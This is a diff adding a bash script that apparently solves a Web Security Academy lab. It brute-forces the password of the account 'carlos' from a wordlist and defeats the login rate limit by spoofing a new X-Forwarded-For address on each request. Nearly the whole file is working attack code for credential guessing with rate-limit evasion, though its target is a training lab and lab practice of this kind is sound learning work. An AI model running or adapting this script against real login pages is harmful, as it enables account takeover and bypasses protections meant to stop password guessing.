@@ -1,0 +1,26 @@
+#!/usr/bin/env bash
+
+HOST="0a6e00ab04ec174681672ffe007a0085.web-security-academy.net"
+NORMAL="Incorrect password."
+LIMIT="You have made too many incorrect login attempts. Please try again in 1 minute(s)."
+i=1
+
+while IFS= read -r p; do
+  msg=$(
+    curl -s -X POST "https://$HOST/login" \
+      -H "X-Forwarded-For: 127.7.1.$i" \
+      --data-urlencode "username=carlos" \
+      --data-urlencode "password=$p" \
+      | grep -oP '<p class=is-warning>\K.*(?=</p>)'
+  )
+
+  if [[ "$msg" == "$NORMAL" ]]; then
+    :
+  elif [[ "$msg" == "$LIMIT" ]]; then
+    echo "Rate limited on password: $p"
+  else
+    echo "$p | $msg"
+  fi
+
+  i=$((i+1))
+done < pass_list.txt
